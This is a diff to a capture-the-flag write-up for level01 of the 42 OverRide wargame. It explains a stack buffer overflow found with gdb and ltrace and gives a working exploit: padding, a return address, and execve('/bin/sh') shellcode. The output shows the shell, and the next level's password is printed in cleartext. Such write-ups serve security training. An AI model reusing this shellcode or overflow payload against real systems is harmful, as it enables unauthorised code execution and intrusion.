@@ -19,7 +19,7 @@ After analyze it with gdb we can find three interesting functions : `main()`, `v
 Please refer to file [asm_analysis.md](https://github.com/maxisimo/42-OverRide/blob/main/level01/Ressources/asm_analysis.md) in parallel of [source.c](https://github.com/maxisimo/42-OverRide/blob/main/level01/source.c) for more details.  
 A first read of ASM code allows us to see that function `verify_user_name` compares the user name to "dat_wil" and function `verify_user_pass` compares password to "admin".  
 By looking closely to the code we can see that finding the password won't help us! Since there is no calls to `/bin/sh`, we can assume we'll have to use a shellcode this time.  
-We'll have to write over `eip`, so first get the offset :
+We'll have to write over `eip` in order to execute our shellcode, so first get the offset :
 ```
 (gdb) run
 Starting program: /home/users/level01/level01
@@ -36,59 +36,51 @@ Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 ```
 Thanks to the pattern generator we found an offset of 80.  
-As the program use `fgets()` function we should not be able to make a buffer overflow but `fgets()` take a max string of 100 chars wich is more than the offset of `eip`.  
-```
-On constate que le deuxieme fgets lit 100 bytes alors que le buffer n'en fait que 64, on peut donc exploiter l'overflow pour reecrire la valeur d'eip et injecter un shellcode.
-Il faut cependant faire attention a donner un username de 256 caracteres au premier fgets.
-Si le username est plus court, alors notre shellcode (situe en principe dans le password) va se faire absorber par le username.
-Si le username est plus long, il va deborder sur le password et donc decaler notre shellcode.
-
-Pour ajuster l'adresse de notre payload, on utilise ltrace qui va nous donner l'adresse du buffer dans lequel est stocke le password :
-fgets(" \220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\2201\300Ph/"..., 100, 0xf7fcfac0) = 0xffffd6bc
-
-On utilise le payload suivant :
-echo $(python -c 'print "dat_will" + "A"*247 + "\n" + "\x90" * 26 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*30 + "\xbd\xd6\xff\xff"') > /tmp/test
-(cat /tmp/test; cat -) | ./level01
-```
+As the program use `fgets()` function we should not be able to make a buffer overflow but `fgets()` take a max string of 100 chars wich is more than the size of our buffer (64).  
 
 ## Create our exploit
-*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php)*  
-In order to store our shellcode, we can use environment variables :
+*shellcode found [here](http://shell-storm.org/shellcode/files/shellcode-827.php) (23 bytes)*  
+We'll use `ltrace` to find the buffer address where the password is stored:
 ```
-level01@OverRide:~$ export SHELLCODE=`python -c 'print "\x90" * 50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'`
-level01@OverRide:~$ env | grep SHELLCODE
-SHELLCODE=��������������������������������������������������1�Ph//shh/bin��PS��
-                                                                                ̀
+level01@OverRide:~$ ltrace ./level01
+__libc_start_main(0x80484d0, 1, -10364, 0x80485c0, 0x8048630 <unfinished ...>
+puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********)           = 39
+printf("Enter Username: ")                                                                  = 16
+fgets(Enter Username: dat_wil
+"dat_wil\n", 256, 0xf7fcfac0)                                                               = 0x0804a040
+puts("verifying username....\n"verifying username....)                                      = 24
+puts("Enter Password: "Enter Password:)                                                     = 17
+fgets(doesn't matter
+"doesn't matter\n", 100, 0xf7fcfac0)                                                        = 0xffffd69c    <--- here she are
+puts("nope, incorrect password...\n"nope, incorrect password...)                            = 29
++++ exited (status 1) +++
 level01@OverRide:~$
 ```
-Find its address with gdb and add some bytes to the address founded in order to jump into the nop sled :
+Our input will be as follow :  
+bytes 1-7: "dat_wil", to pass the `verify_user_name` function.  
+byte  8: '\n', so that the first `fgets` stops taking user input.  
+bytes 9-31: 23 bytes for our shellcode.  
+bytes 31-88: 57 bytes of padding (23 + 57 = 80 to overwrite EIP with the next 4 bytes).  
+bytes 88-92: 0xffffd69c ("\x9c\xd6\xff\xff" in little endian)
 ```
-https://security.stackexchange.com/questions/13194/finding-environment-variables-with-gdb-to-exploit-a-buffer-overflow
-(gdb) set disassembly-flavor intel
-(gdb) disass main
-Dump of assembler code for function main:
-[...]
-  0x0804856d <+157>:	lea    eax,[esp+0x1c]    // buffer start
-[...]
-(gdb)  b *main+157
-Breakpoint 1 at 0x804856d
-(gdb) run
-Starting program: /home/users/level01/level01
+level01@OverRide:~$ python -c 'print "dat_wil" + "\n" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "a" * 57 + "\x9c\xd6\xff\xff"' > /tmp/exploit
+level01@OverRide:~$ cat /tmp/exploit - | ./level01
 ********* ADMIN LOGIN PROMPT *********
-Enter Username: dat_wil
-verifying username....
+Enter Username: verifying username....
 
 Enter Password:
+nope, incorrect password...
 
-Breakpoint 1, 0x0804856d in main ()
-(gdb) x $ebp-0x1008
-0xbfffe680:     0x00000000
-(gdb)
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+exit
+quit
+level01@OverRide:~$ su level02
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level02/level02
+level02@OverRide:~$
 ```
-Our input will be as follow :
-bytes 0-7: "dat_wil", to pass the `verify_user_name` function.
-byte  8: '\n', so that the first `fgets` stops taking user input
-bytes 9-89: padding (80 to overwrite EIP with the next 4 bytes) 
-bytes 90-94: 0xffffd668 + 20 => 0xffffd67c (sometimes, gdb will give us a wrong address so that's why we added nop sled in the environment variable SHELLCODE)
-
-(python -c 'print "dat_wil" + "\n" + "a" * 80 + "address shellcode reversed"'; cat) | ./level01
+Level01 passed !
